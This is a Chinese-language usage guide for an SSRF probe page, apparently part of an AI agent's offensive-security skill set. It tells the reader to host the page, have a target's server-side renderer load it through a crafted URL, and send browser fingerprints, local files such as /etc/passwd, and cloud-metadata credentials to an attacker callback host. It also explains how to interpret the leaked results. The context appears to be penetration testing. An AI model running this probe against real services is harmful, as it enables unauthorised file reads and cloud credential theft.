# references/render-probe.html — 服务端渲染 / 无头浏览器检测页

配合 `../../SKILL.md` **三、服务端无头浏览器渲染专项**使用。目标：一次回显拿到「是不是真浏览器、什么内核什么版本、能不能外带、能不能读 file:// / 云元数据」。

## 文件

- `render-probe.html`：单文件、零外部依赖、ES5 兼容（旧 QtWebKit / wkhtmltopdf 至少能显示基础 UA，看到旧内核本身就是结论）
- 页面里所有查询参数可组合；不传参也能用（只看截图 + 相对信标）

## 快速使用

1. **部署**到你能控制、目标渲染服务能访问的 Web 服务器（VPS / 公网目录 / 临时隧道均可）：

   ```bash
   cd .agents/skills/ssrf-internal-network/references
   python3 -m http.server 8080
   # 本地起好后用 cloudflared / frp 之类把 8080 暴露成公网 https 或 http 地址
   ```

2. **让目标去渲染它**（按目标功能替换外层接口；嵌套 URL 记得整体编码一次）：

   ```
   https://target/render?url=https%3A%2F%2Fyour-host%2Frender-probe.html%3Fcb%3Dhttps%253A%252F%252Fyour-callback.example%252Flog
   ```

3. **看三处证据**：

   - 返回的截图 / PDF：大字 `navigator.userAgent`、内核粗判、UA-CH、file:// iframe 内容
   - 你的 HTTP 回调日志：`probe=js`、`probe=file`、`probe=meta`、`probe=summary` 的查询参数
   - 你的 Web 服务器访问日志：渲染器请求本页的 **UA 和来源 IP**，以及页面内相对路径信标（`./__probe/static.gif?p=...`）的二次请求

## 参数

| 参数 | 默认 | 说明 |
|---|---|---|
| `cb` | 空 | HTTP(S) 回调地址（webhook.site / 自建）。JS 指纹、file/meta 探测结果会以查询参数带出。**不要用纯 DNSLog 承载长数据**（DNS 只能证明出网） |
| `id` | 随机 | 任务 ID，多目标对照用 |
| `file` | `file:///etc/passwd,file:///etc/hostname,file:///etc/hosts` | file:// 探测列表，仅接受 `file://` 前缀；每个渲染一个 iframe；`file=0` 关闭 |
| `meta` | `1` | `0`=关闭云元数据探测 |
| `wait` | `0` | 全部探测完成后延迟多久显示 `PROBES_DONE`（ms），给截图服务留时间 |

## 结果判读

| 现象 | 结论 |
|---|---|
| 你的 Web 日志里 UA 含 `HeadlessChrome/<ver>` 或 `Chrome/<ver> (X11; Linux)` | 后端是无头 Chromium（Puppeteer / Playwright Chromium） |
| UA 像 macOS Safari，但请求来自云 IP，且回调 `probe=js` 到达 | 很可能是 Playwright WebKit（默认伪装 Safari UA） |
| 截图/PDF 出现大字 `JS_EXECUTED ✓` 与自己的 UA | 页面 JS 确实执行，继续做内核版本 → N-day |
| 只收到本页与相对信标请求，`probe=js` 没来 | 仅 HTTP 抓取 / HTML 解析，不跑 JS → 按 SKILL 第一、二、四、五节打普通 SSRF |
| file:// iframe 在截图/PDF 中显示内容 | 渲染器允许读本地文件，可读 `/etc/passwd`、配置、密钥 |
| 元数据行 `READABLE` | 响应可读且 CORS 放开，凭据可直接外带（严重） |
| 元数据行 `REACHABLE(no-cors)` | 网络可达但被 CORS 挡住（盲打 / 看截图内容 / 换容器内验证） |
| 元数据行 `BLOCKED/UNREACHABLE` | 不可达；若是 HTTPS 页面注意上方 Mixed Content 提示，否则可能网络隔离或 PNA 拦截 |

## 限制与注意

- **协议**：元数据是 `http://`，检测页最好也用 HTTP 部署；HTTPS 页面里的 `http://` 请求会被 Mixed Content 拦掉（页面会给出提示）
- **file://**：现代 Chromium 从 http(s) 页面默认禁止加载 `file://` 子资源；iframe 空白 ≠ 一定不可读，需要配合「服务端直接指定 file:// URL」或 HTML→PDF 的本地文件向量（见 SKILL 3.3）
- **PNA**：公网页面 `fetch` 私网/元数据地址可能触发 Private Network Access 预检，`no-cors` 也会被拦；以回调 + 服务端日志 + 换入口交叉验证
- **截图时序**：截图通常发生在 load 之后，异步探测可能来不及入图；以回调外带为准，截图看 UA / file:// 这类同步结果。服务端若支持 `wait`/延时截图参数，配合 `?wait=3000`
- **HTML 型入口**：如果目标要的是「提交 HTML 源码」而不是 URL，把模板里的 `var cb = q.cb || '';` 改成写死回调，或部署后用 URL 提交
- **旧内核**：ES5 写法保证老引擎能显示 UA/内核，但 `fetch`/UA-CH 分支不可用；看到 `AppleWebKit/605.1.15` 配老 QtWebKit 特征（wkhtmltopdf）优先按 SKILL 3.3 的低门槛向量打
- **回调重复**：同一 `probe` 可能收到两条请求（`fetch` + `Image` 双通道容错），属正常；页面里的 `./__probe/static.gif?p=...` 是相对信标，服务器返回 404 也正常，只看访问日志里有没有这次请求
- 回调服务器与截图/PDF 里可能出现元数据凭据，**自控保存并对报告脱敏**（角色名、AK 打码，只保留可复现证据链）
